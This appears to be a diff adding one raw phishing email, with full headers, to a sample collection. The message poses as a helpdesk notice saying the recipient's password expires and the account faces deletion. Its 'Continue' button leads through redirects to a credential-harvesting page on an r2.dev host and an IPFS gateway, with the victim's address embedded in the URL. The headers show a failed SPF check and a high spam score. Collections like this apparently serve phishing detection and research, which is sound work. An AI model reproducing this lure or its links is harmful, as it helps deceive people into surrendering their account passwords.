@@ -1,0 +1,141 @@
+From jose@monkey.org Wed Oct 18 02:16:18 2023 +0000
+Return-Path: sara@dragon-iec.com
+Delivered-To: jose@monkey.org
+X-FDA: 81356967636.16.EC374F3
+Received: from 204.44.127.152.static.quadranet.com (unknown [204.44.127.152])
+	by imf13.b.hostedemail.com (Postfix) with ESMTP id 1B79F120004
+	for <jose@monkey.org>; Wed, 18 Oct 2023 02:16:15 +0000 (UTC)
+Authentication-Results: imf13.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf13.b.hostedemail.com: 204.44.127.152 is neither permitted nor denied by domain of sara@dragon-iec.com) smtp.mailfrom=sara@dragon-iec.com
+ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=hostedemail.com;
+	s=arc-20220608; t=1697595377;
+	h=from:from:sender:reply-to:subject:subject:date:date:
+	 message-id:message-id:to:to:cc:mime-version:mime-version:
+	 content-type:content-type:
+	 content-transfer-encoding:content-transfer-encoding:in-reply-to:
+	 references; bh=EowWnTgDlRPqyQs1E7dDcI/nlw1IsXBmXimocFKaXFE=;
+	b=TG/B/m02ed97U5VtttJah8C9QqpoGUT/JkOh6K+JvmwmcnSvr4jT2eowesMlWqczo99sob
+	fTK26ijDWn3L+l2XcSX6wiGueRxUFAuP1CAd5hkLZJNEsr8Mc4+A9b0Ms5qiCgRq1Rs96n
+	hIAaHEAuZvcIKpID324+yYgNcAFfs+A=
+ARC-Authentication-Results: i=1;
+	imf13.b.hostedemail.com;
+	dkim=none;
+	dmarc=none;
+	spf=softfail (imf13.b.hostedemail.com: 204.44.127.152 is neither permitted nor denied by domain of sara@dragon-iec.com) smtp.mailfrom=sara@dragon-iec.com
+ARC-Seal: i=1; s=arc-20220608; d=hostedemail.com; t=1697595377; a=rsa-sha256;
+	cv=none;
+	b=guK3Zt/pFm2HRBgA1LODYIg7VVP00qr5gmta9VoltgYcUTBVkaCs4RRl3mj5JLLMTnsZ6w
+	4SZQk/N4LYBfzp5wM18LNY30S1HnqOr8Bptcm9rteZF8cNjCL5+JnuZwE+Kn4eenlmn62Y
+	3CGiVECI1qIo4Q51LE1NapAAjWktFbo=
+From: Helpdesk <sara@dragon-iec.com
+To: jose@monkey.org
+Subject: Action Required: Account and Service(s) Scheduled for Deletion.
+Date: 17 Oct 2023 19:16:15 -0700
+Message-ID: <20231017191615.265E3B9EB72DF4E6@dragon-iec.com>
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+X-Rspamd-Server: rspam11
+X-Rspamd-Queue-Id: 1B79F120004
+X-Stat-Signature: wmsypp8y7dkx99i9e1x4ekd15sue3ni7
+X-Rspam-User: 
+X-Spam-Status: Yes, score=13.09
+X-HE-Tag: 1697595375-231169
+X-HE-Meta: U2FsdGVkX1+DNYYxsIt93Rh69PcHls28fnirol1msZdr6mR/PY/Tqn7P2P7vfkW2cA2T5cHZGUFB72EbfvKCLBYdCTEOoUy7wkQO+QKMv3k01IJRKt+QWoB3o34VD99B3CD8LDbzb2OhFp+QaJOoeQzUnSIfKPXYQth2UYH0/PIs+71KUtjgRNTvX4r+gKsUjkd22/0KqFvxpP0buTgvCYiz+w8sZOweOM+YkyVu7ZI=
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 315
+
+<html><head>
+<meta http-equiv=3D"X-UA-Compatible" content=3D"IE=3Dedge">
+</head>
+<body><div tabindex=3D"1" class=3D"Am Al editable LW-avf tS-tW tS-tY" id=3D=
+":r1" role=3D"textbox" aria-controls=3D":tn" aria-owns=3D":tn" style=3D"dir=
+ection: ltr; min-height: 240px;" contenteditable=3D"true" hidefocus=3D"true=
+" spellcheck=3D"false" aria-label=3D"Message Body" aria-multiline=3D"true" =
+g_editable=3D"true">
+
+<div style=3D"background: rgb(249, 249, 249); width: 600px; text-align: lef=
+t; color: rgb(44, 54, 58); text-transform: none; text-indent: 0px; letter-s=
+pacing: normal; font-family: Roboto,sans-serif; font-size: 14px; font-style=
+: normal; font-weight: 400; word-spacing: 0px; white-space: normal; box-siz=
+ing: border-box; font-variant-ligatures: normal; font-variant-caps: normal;=
+ text-decoration-style: initial; text-decoration-color: initial;">
+<div style=3D"padding: 50px 30px 30px; box-sizing: border-box;"><div style=
+=3D"box-sizing: border-box;"><table width=3D"100%" style=3D"border-collapse=
+: collapse; box-sizing: border-box;"><tbody style=3D"box-sizing: border-box=
+;"><tr style=3D"box-sizing: border-box;"><td style=3D"text-align: right; fo=
+nt-size: 22px; font-weight: 600; box-sizing: border-box;">Action Required: =
+Account and Service(s) Scheduled for Deletion.</td></tr></tbody></table></d=
+iv><div style=3D"box-sizing: border-box;">&nbsp;</div>
+<div style=3D"background: black; padding: 5px; color: white; box-sizing: bo=
+rder-box;">Password expires&nbsp; 17
+ Oct 2023] - 08:05 AM.</div><div style=3D"box-sizing: border-box;">&nbsp;</=
+div><div style=3D"background: white; box-sizing: border-box;"><table width=
+=3D"100%" style=3D"border-collapse: collapse; box-sizing: border-box;"><tbo=
+dy style=3D"box-sizing: border-box;"><tr style=3D"box-sizing: border-box;">=
+<td style=3D"padding: 5px; box-sizing: border-box;" colspan=3D"2">jose@monk=
+ey.org Password expires=20
+17
+ Oct 2023
+
+=2E, please follow below portal to change or update password.</td></tr><tr =
+style=3D"box-sizing: border-box;"><td style=3D"padding: 5px; box-sizing: bo=
+rder-box;">Recipient:</td><td style=3D"padding: 5px; text-align: right; box=
+-sizing: border-box;">&lt;jose@monkey.org&gt;</td></tr><tr style=3D"box-siz=
+ing: border-box;"><td style=3D"padding: 5px; box-sizing: border-box;">Date:=
+</td><td style=3D"padding: 5px; text-align: right; box-sizing: border-box;"=
+>17
+ Oct 2023.</td></tr><tr style=3D"box-sizing: border-box;"><td style=3D"padd=
+ing: 5px; box-sizing: border-box;">Time:</td><td style=3D"padding: 5px; tex=
+t-align: right; box-sizing: border-box;">08:05 AM</td></tr><tr style=3D"box=
+-sizing: border-box;"><td style=3D"padding: 5px; box-sizing: border-box;">E=
+xpires:</td><td style=3D"padding: 5px; text-align: right; box-sizing: borde=
+r-box;">17
+ Oct 2023</td></tr></tbody></table></div><div style=3D"box-sizing: border-b=
+ox;">&nbsp;</div><div style=3D"box-sizing: border-box;"><table width=3D"120=
+" style=3D"background: rgb(0, 103, 184); color: white; border-collapse: col=
+lapse; box-sizing: border-box;"><tbody style=3D"box-sizing: border-box;"><t=
+r style=3D"box-sizing: border-box;"><td style=3D"box-sizing: border-box;">
+<a style=3D"color: white; text-decoration: none; box-sizing: border-box; ba=
+ckground-color: transparent;" href=3D"https://pub-3fd918244c3b445c80a602172=
+4f6a025.r2.dev/Monotomic.html#jose@monkey.org" target=3D"_blank" rel=3D"nor=
+eferrer"=20
+data-saferedirecturl=3D"https://www.google.com/url?q=3Dhttps://app.donorvie=
+w.com/Communication/Click?prm%3DuEvQjbLyROfQy1XICroxZgnn6zkK-jxszv3c-V7QVTz=
+byWCRnwEo72rfjdFLOn6LD-AbzGoObSWvJEDMZH3l_sAl_z1NUhFuXl1zt3juOmIcN_J3w3rrSb=
+zKkTErDNu48wmAjuOwMWYFji5HSlNfrNvlQzfcdYndFW3XpMVPR1ahJlmQEYNAysRt4-YWnhMQP=
+XKbA4Diq5MECXxH0hT8_be4LADzMz-s1ZJP8a9qn301%26target%3Dhttps://bafybeicsjbl=
+wdl4ft7wqapsblpm7l53nnwgvy3xfqrl7l43u2btetrxhrq.ipfs.cf-ipfs.com/?filename%=
+3D%23%5B%5B-Email-%5D%5D&amp;source=3Dgmail&amp;ust=3D1696
+292289348000&amp;usg=3DAOvVaw3TVXj6eJZ_kaqQ3SJ29xVH">Continue &gt;&gt;</a><=
+/td></tr></tbody></table></div></div></div>
+<div style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: non=
+e; text-indent: 0px; letter-spacing: normal; font-family: Roboto,sans-serif=
+; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px;=
+ white-space: normal; box-sizing: border-box; background-color: rgb(255, 25=
+5, 255); font-variant-ligatures: normal; font-variant-caps: normal; text-de=
+coration-style: initial; text-decoration-color: initial;">&nbsp;</div>
+<b style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: none;=
+ text-indent: 0px; letter-spacing: normal; font-family: Roboto,sans-serif; =
+font-size: 14px; font-style: normal; font-weight: bolder; word-spacing: 0px=
+; white-space: normal; box-sizing: border-box; background-color: rgb(255, 2=
+55, 255); font-variant-ligatures: normal; font-variant-caps: normal; text-d=
+ecoration-style: initial; text-decoration-color: initial;">Note:</b>
+<span style=3D"text-align: left; color: rgb(44, 54, 58); text-transform: no=
+ne; text-indent: 0px; letter-spacing: normal; font-family: Roboto,sans-seri=
+f; font-size: 14px; font-style: normal; font-weight: 400; word-spacing: 0px=
+; float: none; display: inline; white-space: normal; background-color: rgb(=
+255, 255, 255); font-variant-ligatures: normal; font-variant-caps: normal; =
+text-decoration-style: initial; text-decoration-color: initial;"><span>&nbs=
+p;</span>
+The content of this email is confidential and intended for the recipient sp=
+ecified in message only. It is strictly forbidden to share any part of this=
+ message with any third party, without a written consent of the sender. If =
+you received this message by mistake, please reply to this message and foll=
+ow with its deletion, so that we can ensure such a mistake does not occur i=
+n the future.</span>
+</div></body></html>
